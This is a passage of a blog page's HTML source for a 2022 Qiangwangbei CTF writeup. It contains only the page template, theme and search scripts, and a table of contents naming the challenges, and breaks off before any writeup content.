@@ -1,0 +1,627 @@
+<!DOCTYPE html><html lang="zh"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="generator" content="Astro v5.17.3"><title>强网杯 2022 Writeup</title><meta name="title" content="强网杯 2022 Writeup"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/atom.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/qwb-2022/"><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/qwb-2022/"><meta property="og:title" content="强网杯 2022 Writeup"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/qwb-2022/"><meta property="twitter:title" content="强网杯 2022 Writeup"><meta property="twitter:description" content><!-- 暗色模式初始化脚本 --><script>
+	// 防止暗色模式闪烁
+	(function() {
+		const theme = localStorage.getItem('theme');
+		const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+		
+		if (theme === 'dark' || (!theme && systemPrefersDark)) {
+			document.documentElement.classList.add('dark');
+		} else {
+			document.documentElement.classList.remove('dark');
+		}
+	})();
+</script><script lang="js">
+			// 动态导入 APlayer 并挂载到全局对象
+			import('aplayer').then(function(APlayerModule) {
+				window.APlayer = APlayerModule.default;
+			});
+		</script><link rel="stylesheet" href="/_astro/_slug_.DNYbVg5E.css">
+<link rel="stylesheet" href="/_astro/waline.BpVnDCEn.css">
+<link rel="stylesheet" href="/_astro/_slug_.N2UNtMs9.css">
+<style>.toc[data-astro-cid-woz2nwfv]{position:fixed;top:12rem;right:6rem;width:260px;max-height:calc(100vh - 16rem);overflow-y:auto;padding:1.5rem;font-size:.9375rem;line-height:1.5;z-index:100}.toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar{width:4px}.toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar-thumb{background:#0003;border-radius:2px}.dark[data-astro-cid-woz2nwfv] .toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar-thumb{background:#ffffff4d}@media(max-width:1280px){.toc[data-astro-cid-woz2nwfv]{position:static;width:100%;max-height:none;margin:2rem 0}}.toc-title[data-astro-cid-woz2nwfv]{font-size:1rem;font-weight:600;margin:0 0 1rem}.toc-list[data-astro-cid-woz2nwfv],.toc-sublist[data-astro-cid-woz2nwfv]{list-style:none;padding:0;margin:0}.toc-sublist[data-astro-cid-woz2nwfv]{padding-left:1.25rem;margin:.25rem 0}.toc-link[data-astro-cid-woz2nwfv]{display:block;text-decoration:none;padding:.375rem .5rem;margin:.125rem 0;border-radius:.5rem;font-weight:400}.toc-link[data-astro-cid-woz2nwfv].active{font-weight:500;background:#3b82f61a!important;color:#3b82f6!important}.dark[data-astro-cid-woz2nwfv] .toc-link[data-astro-cid-woz2nwfv].active{background:#60a5fa33!important;color:#60a5fa!important}.lightbox[data-astro-cid-vqtgpguw]{position:fixed;inset:0;z-index:500;display:flex;align-items:center;justify-content:center;animation:fade-in .3s;backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);background:#3037424d;overflow:hidden;padding:20px;box-sizing:border-box}.lightbox[data-astro-cid-vqtgpguw].exit{animation:fade-out .3s}@keyframes fade-in{0%{opacity:0}}@keyframes fade-out{to{opacity:0}}.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw]{max-width:80vw!important;max-height:75vh!important;width:auto!important;height:auto!important;-o-object-fit:contain!important;object-fit:contain!important;border-radius:3px;cursor:zoom-out;display:block!important;margin:0 auto;opacity:0;transition:opacity .3s ease}.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw].show{opacity:1}.lightbox[data-astro-cid-vqtgpguw] .toolbar[data-astro-cid-vqtgpguw]{position:absolute;bottom:5%;left:1rem;right:1rem;display:flex;justify-content:space-between;align-items:center;color:#fff;max-width:600px;-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px);margin:0 auto;padding:10px;border-radius:5px;background:#0000001a;z-index:1}.lightbox[data-astro-cid-vqtgpguw] .btn[data-astro-cid-vqtgpguw]{width:32px;height:32px;display:flex;justify-content:center;align-items:center;cursor:pointer;border-radius:3px;background:#fff3;transition:all .2s}.lightbox[data-astro-cid-vqtgpguw] .btn[data-astro-cid-vqtgpguw]:hover{background:#ffffff80}.lightbox[data-astro-cid-vqtgpguw] .counter[data-astro-cid-vqtgpguw]{width:60px;display:flex;align-items:center;justify-content:center;font-size:14px}.lightbox[data-astro-cid-vqtgpguw] .nav[data-astro-cid-vqtgpguw]{display:flex;gap:10px}@media(max-width:768px){.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw]{max-width:75vw!important;max-height:65vh!important}}
+</style></head> <body class="bg-white dark:bg-gray-900 transition-colors duration-300"> <header class="relative m-0 px-4 py-4" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" aria-label="主导航" data-astro-cid-3ef6ksr2> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a><a href="/archive" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a><a href="/links" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a><a href="/guestbook" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a><a href="/about" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <!-- 桌面端搜索和主题切换按钮 --> <div class="absolute right-4 top-1/2 transform -translate-y-1/2 hidden md:flex items-center gap-3" data-astro-cid-3ef6ksr2> <button id="search-btn" class="flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="打开搜索" title="搜索 (Ctrl+K)" data-astro-cid-3ef6ksr2> <svg class="w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-3ef6ksr2> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-3ef6ksr2></path> </svg> </button> <button class="theme-toggle flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="切换暗色模式" title="切换暗色模式" data-astro-cid-x3pjskd3> <svg class="sun-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" data-astro-cid-x3pjskd3></path> </svg> <svg class="moon-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" data-astro-cid-x3pjskd3></path> </svg> </button> <script>
+(function() {
+	function getSystemTheme() {
+		return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+	}
+
+	function getCurrentTheme() {
+		const saved = localStorage.getItem('theme');
+		return (!saved || saved === 'auto') ? getSystemTheme() : saved;
+	}
+
+	function applyTheme(theme) {
+		document.documentElement.classList.toggle('dark', theme === 'dark');
+	}
+
+	function toggleTheme() {
+		const isDark = document.documentElement.classList.contains('dark');
+		const newTheme = isDark ? 'light' : 'dark';
+		localStorage.setItem('theme', newTheme);
+		applyTheme(newTheme);
+	}
+
+	function init() {
+		applyTheme(getCurrentTheme());
+		document.querySelectorAll('.theme-toggle').forEach(btn => {
+			if (!btn.dataset.ready) {
+				btn.addEventListener('click', toggleTheme);
+				btn.dataset.ready = 'true';
+			}
+		});
+	}
+
+	init();
+
+	window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+		const saved = localStorage.getItem('theme');
+		if (!saved || saved === 'auto') applyTheme(e.matches ? 'dark' : 'light');
+	});
+
+	document.addEventListener('astro:page-load', init);
+})();
+</script>  </div> <!-- 移动端控件 --> <div class="md:hidden flex items-center justify-between w-full" data-astro-cid-3ef6ksr2> <button id="menu-btn" class="flex flex-col space-y-1 p-2 text-black dark:text-white" aria-label="打开菜单" aria-expanded="false" aria-controls="menu" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <div class="flex items-center gap-2" data-astro-cid-3ef6ksr2> <button id="search-btn-mobile" class="flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="打开搜索" data-astro-cid-3ef6ksr2> <svg class="w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-3ef6ksr2> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-3ef6ksr2></path> </svg> </button> <button class="theme-toggle flex items-center justify-center p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200 bg-transparent border-none cursor-pointer" aria-label="切换暗色模式" title="切换暗色模式" data-astro-cid-x3pjskd3> <svg class="sun-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" data-astro-cid-x3pjskd3></path> </svg> <svg class="moon-icon w-5 h-5 text-gray-600 dark:text-gray-300 transition-transform duration-200 hover:scale-110 active:scale-95" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" data-astro-cid-x3pjskd3></path> </svg> </button> <script>
+(function() {
+	function getSystemTheme() {
+		return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+	}
+
+	function getCurrentTheme() {
+		const saved = localStorage.getItem('theme');
+		return (!saved || saved === 'auto') ? getSystemTheme() : saved;
+	}
+
+	function applyTheme(theme) {
+		document.documentElement.classList.toggle('dark', theme === 'dark');
+	}
+
+	function toggleTheme() {
+		const isDark = document.documentElement.classList.contains('dark');
+		const newTheme = isDark ? 'light' : 'dark';
+		localStorage.setItem('theme', newTheme);
+		applyTheme(newTheme);
+	}
+
+	function init() {
+		applyTheme(getCurrentTheme());
+		document.querySelectorAll('.theme-toggle').forEach(btn => {
+			if (!btn.dataset.ready) {
+				btn.addEventListener('click', toggleTheme);
+				btn.dataset.ready = 'true';
+			}
+		});
+	}
+
+	init();
+
+	window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+		const saved = localStorage.getItem('theme');
+		if (!saved || saved === 'auto') applyTheme(e.matches ? 'dark' : 'light');
+	});
+
+	document.addEventListener('astro:page-load', init);
+})();
+</script>  </div> </div> <div id="menu" class="md:hidden absolute top-full left-4 right-4 bg-white dark:bg-gray-800 rounded-xl shadow-2xl border border-gray-100 dark:border-gray-700 backdrop-blur-md hidden mt-3 z-50" role="menu" aria-labelledby="menu-btn" data-astro-cid-3ef6ksr2> <div class="flex flex-col" data-astro-cid-3ef6ksr2> <a href="/" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Home </a><a href="/archive" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Blog </a><a href="/links" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Links </a><a href="/guestbook" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> Comment </a><a href="/about" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors block w-full px-5 py-4 text-left text-gray-800 dark:text-gray-200 bg-transparent border-b border-gray-200 dark:border-gray-700 font-medium text-[0.95rem] leading-none no-underline tracking-wide transition-all duration-200 hover:bg-gray-50 hover:text-blue-500 dark:hover:bg-gray-700/60 dark:hover:text-blue-400 first:rounded-t-xl last:rounded-b-xl last:border-b-0"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),n=document.getElementById("menu");function i(){n?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单")}function d(){n?.classList.remove("hidden"),e?.classList.add("open"),e?.setAttribute("aria-expanded","true"),e?.setAttribute("aria-label","关闭菜单")}e&&n&&(e.addEventListener("click",()=>{e.classList.contains("open")?i():d()}),e.addEventListener("keydown",t=>{(t.key==="Enter"||t.key===" ")&&(t.preventDefault(),e.click())}),document.addEventListener("keydown",t=>{t.key==="Escape"&&e.classList.contains("open")&&(i(),e.focus())}),document.addEventListener("click",t=>{const s=t.target;!e.contains(s)&&!n.contains(s)&&i()}));const c=document.getElementById("search-btn"),a=document.getElementById("search-btn-mobile");function o(){typeof window.openSearchModal=="function"&&window.openSearchModal()}c&&c.addEventListener("click",o);a&&a.addEventListener("click",o);</script>  <!-- 搜索模态框 --><div id="search-modal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/50 dark:bg-black/70 backdrop-blur-sm" role="dialog" aria-modal="true" aria-labelledby="search-modal-title" data-astro-cid-qk3db3zz> <div class="relative w-full max-w-2xl mx-4 bg-white dark:bg-gray-800 rounded-2xl shadow-2xl transform transition-all" id="search-modal-content" data-astro-cid-qk3db3zz> <!-- 搜索框 --> <div class="p-4 border-b border-gray-200 dark:border-gray-700" data-astro-cid-qk3db3zz> <div class="relative" data-astro-cid-qk3db3zz> <input type="text" id="search-modal-input" placeholder="输入关键词搜索文章..." class="w-full px-4 py-3 pl-10 pr-10 text-base bg-gray-100 dark:bg-gray-700 rounded-xl border border-transparent
+            placeholder:text-gray-400 dark:placeholder:text-gray-500
+            focus:ring-2 focus:ring-blue-500/30 focus:border-blue-500/50 focus:bg-white dark:focus:bg-gray-600
+            focus:outline-none
+            transition-all duration-200
+            text-gray-900 dark:text-white" autocomplete="off" data-astro-cid-qk3db3zz> <div class="absolute left-3 top-1/2 -translate-y-1/2" data-astro-cid-qk3db3zz> <svg class="w-5 h-5 text-gray-400 dark:text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-qk3db3zz></path> </svg> </div> <button id="search-modal-close" class="absolute right-3 top-1/2 -translate-y-1/2 p-1 text-gray-400 dark:text-gray-500 hover:text-gray-600 dark:hover:text-gray-300 transition-colors" aria-label="关闭搜索" data-astro-cid-qk3db3zz> <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" data-astro-cid-qk3db3zz></path> </svg> </button> </div> </div> <!-- 搜索结果容器 --> <div class="max-h-[60vh] overflow-y-auto" data-astro-cid-qk3db3zz> <!-- 搜索结果 --> <div id="search-modal-results" class="p-4 space-y-3" data-astro-cid-qk3db3zz> <!-- 结果将在这里动态插入 --> </div> <!-- 空状态 --> <div id="search-modal-empty" class="hidden p-12 text-center" data-astro-cid-qk3db3zz> <div class="mb-4" data-astro-cid-qk3db3zz> <svg class="w-12 h-12 text-gray-300 dark:text-gray-600 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-qk3db3zz> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" data-astro-cid-qk3db3zz></path> </svg> </div> <h3 class="text-base font-medium text-gray-900 dark:text-gray-100 mb-2" data-astro-cid-qk3db3zz>
+未找到相关文章
+</h3> <p class="text-sm text-gray-500 dark:text-gray-400" data-astro-cid-qk3db3zz>
+试试其他关键词
+</p> </div> <!-- 加载状态 --> <div id="search-modal-loading" class="hidden p-12 text-center" data-astro-cid-qk3db3zz> <div class="inline-block animate-spin h-6 w-6 border-2 border-gray-400 dark:border-gray-500 border-t-transparent rounded-full" data-astro-cid-qk3db3zz></div> </div> </div> <!-- 快捷键提示 --> <div class="px-4 py-2 border-t border-gray-200 dark:border-gray-700 text-xs text-gray-500 dark:text-gray-400 flex items-center justify-between" data-astro-cid-qk3db3zz> <span data-astro-cid-qk3db3zz>按 <kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs" data-astro-cid-qk3db3zz>Esc</kbd> 关闭</span> <span data-astro-cid-qk3db3zz>按 <kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs" data-astro-cid-qk3db3zz>↑</kbd><kbd class="px-1.5 py-0.5 bg-gray-100 dark:bg-gray-700 rounded text-xs ml-1" data-astro-cid-qk3db3zz>↓</kbd> 导航</span> </div> </div> </div> <script type="module">let L=[],p=null,a=-1,h=[];const s=document.getElementById("search-modal");document.getElementById("search-modal-content");const i=document.getElementById("search-modal-input"),x=document.getElementById("search-modal-close"),c=document.getElementById("search-modal-results"),l=document.getElementById("search-modal-empty"),y=document.getElementById("search-modal-loading");async function b(){if(!(L.length>0))try{L=await(await fetch("/search.json")).json()}catch(e){console.error("加载搜索索引失败:",e)}}function u(e){const t=document.createElement("div");return t.textContent=e,t.innerHTML}function k(e,t){if(!t.trim())return e;const n=new RegExp(`(${t.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")})`,"gi");return e.replace(n,'<mark class="bg-yellow-200 dark:bg-yellow-800/50 px-0.5 rounded">$1</mark>')}function M(e){if(!e.trim())return[];const t=e.toLowerCase(),n=[];for(const r of L){const d=r.title.toLowerCase().includes(t),m=r.content.toLowerCase().includes(t),g=r.categories.some(o=>o.toLowerCase().includes(t)),v=r.tags.some(o=>o.toLowerCase().includes(t));if(d||m||g||v){let o=0;d&&(o+=10),m&&(o+=1),g&&(o+=3),v&&(o+=3),n.push({...r,score:o})}}return n.sort((r,d)=>r.score!==d.score?(d.score||0)-(r.score||0):new Date(d.date).getTime()-new Date(r.date).getTime())}function T(e,t){if(!(!c||!l||!y)){if(y.classList.add("hidden"),a=-1,e.length===0){c.innerHTML="",l.classList.remove("hidden");return}l.classList.add("hidden"),c.innerHTML=e.map((n,r)=>{const d=k(u(n.title),t),m=k(u(n.excerpt),t),g=new Date(n.date).toLocaleDateString("zh-CN",{year:"numeric",month:"short",day:"numeric"});return`
+        <a 
+          href="${u(n.url)}" 
+          class="block p-3 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors search-result-item ${r===a?"bg-gray-100 dark:bg-gray-700":""}"
+          data-index="${r}"
+        >
+          <h3 class="text-base font-semibold text-gray-900 dark:text-white mb-1">${d}</h3>
+          <p class="text-sm text-gray-600 dark:text-gray-400 mb-2 line-clamp-1">${m}</p>
+          <div class="flex flex-wrap items-center gap-2 text-xs text-gray-500 dark:text-gray-400">
+            <time datetime="${n.date}">${g}</time>
+            ${n.categories.length>0?`<span>·</span><span>${u(n.categories[0])}</span>`:""}
+            ${n.tags.length>0?`<span>·</span><span>${u(n.tags[0])}</span>`:""}
+          </div>
+        </a>
+      `}).join(""),w()}}function w(){c?.querySelectorAll(".search-result-item")?.forEach((t,n)=>{n===a?t.classList.add("bg-gray-100","dark:bg-gray-700"):t.classList.remove("bg-gray-100","dark:bg-gray-700")})}function I(){if(!i)return;const e=i.value.trim();if(p&&clearTimeout(p),e.length===0){c&&l&&(c.innerHTML="",l.classList.add("hidden"));return}y&&y.classList.remove("hidden"),p=setTimeout(()=>{h=M(e),T(h,e)},200)}function E(){!s||!i||(s.classList.remove("hidden"),s.classList.add("flex"),setTimeout(()=>{i.focus()},100),b(),document.body.style.overflow="hidden")}function f(){!s||!i||(s.classList.add("hidden"),s.classList.remove("flex"),i.value="",c&&l&&(c.innerHTML="",l.classList.add("hidden")),a=-1,h=[],document.body.style.overflow="")}function $(){!s||!i||!x||(s.addEventListener("click",e=>{e.target===s&&f()}),x.addEventListener("click",f),i.addEventListener("input",I),i.addEventListener("keydown",e=>{if(e.key==="Escape")e.preventDefault(),f();else if(e.key==="ArrowDown")e.preventDefault(),a<h.length-1&&(a++,w());else if(e.key==="ArrowUp")e.preventDefault(),a>0&&(a--,w());else if(e.key==="Enter"&&a>=0){e.preventDefault();const t=c?.querySelector(`[data-index="${a}"]`);t&&(window.location.href=t.href)}}),document.addEventListener("keydown",e=>{(e.metaKey||e.ctrlKey)&&e.key==="k"&&(e.preventDefault(),s?.classList.contains("hidden")?E():f())}),window.openSearchModal=E)}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",$):$();</script>  <main class="min-h-screen" role="main" aria-label="文章内容"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 dark:text-white mb-6 tracking-tight leading-tight"> 强网杯 2022 Writeup </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2022-08-01T18:57:47.000Z" class="text-[#86868b] dark:text-gray-400 tracking-wide"> <time datetime="2022-08-01T18:57:47.000Z"> Aug 1, 2022 </time> </time>  <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <span class="text-[#86868b] dark:text-gray-400 tracking-wide" aria-label="阅读时间 13 min read">13 min read</span>   <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-3" aria-label="文章分类">  <a href="/categories/技术.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看分类 技术 下的所有文章"> 技术 </a>  </nav>   <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-2" aria-label="文章标签">  <a href="/tags/CTF.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 CTF 下的所有文章"> CTF </a> <span class="text-[#d2d2d7] dark:text-gray-500" aria-hidden="true">·</span> <a href="/tags/网络安全.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 网络安全 下的所有文章"> 网络安全 </a> <span class="text-[#d2d2d7] dark:text-gray-500" aria-hidden="true">·</span> <a href="/tags/Writeup.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 Writeup 下的所有文章"> Writeup </a>  </nav>  </div> </header>  <nav class="toc transition-colors duration-300" aria-label="文章目录" data-astro-cid-woz2nwfv> <h2 class="toc-title text-gray-900 dark:text-white" data-astro-cid-woz2nwfv>文章目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#写在前面" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1. 写在前面 </a>  </li><li data-astro-cid-woz2nwfv> <a href="#强网先锋" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2. 强网先锋 </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#rcefile" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.1. rcefile </a> </li><li data-astro-cid-woz2nwfv> <a href="#wp_um" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.2. WP_UM </a> </li><li data-astro-cid-woz2nwfv> <a href="#asr" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.3. ASR </a> </li><li data-astro-cid-woz2nwfv> <a href="#polydiv" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.4. polydiv </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#web" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3. Web </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#babyweb" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.1. babyweb </a> </li><li data-astro-cid-woz2nwfv> <a href="#crash" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.2. crash </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#crypto" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4. Crypto </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#myjwt" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4.1. myJWT </a> </li> </ol> </li> </ol> </nav>  <script lang="js">
+  function initTableOfContents() {
+    const links = document.querySelectorAll('.toc-link');
+    const headings = Array.from(links)
+      .map(link => {
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const id = href.slice(1);
+          return document.getElementById(id);
+        }
+        return null;
+      })
+      .filter(element => element !== null);
+
+    // 平滑滚动功能
+    function scrollToElement(targetId) {
+      const target = document.getElementById(targetId);
+      if (target) {
+        const headerOffset = 100;
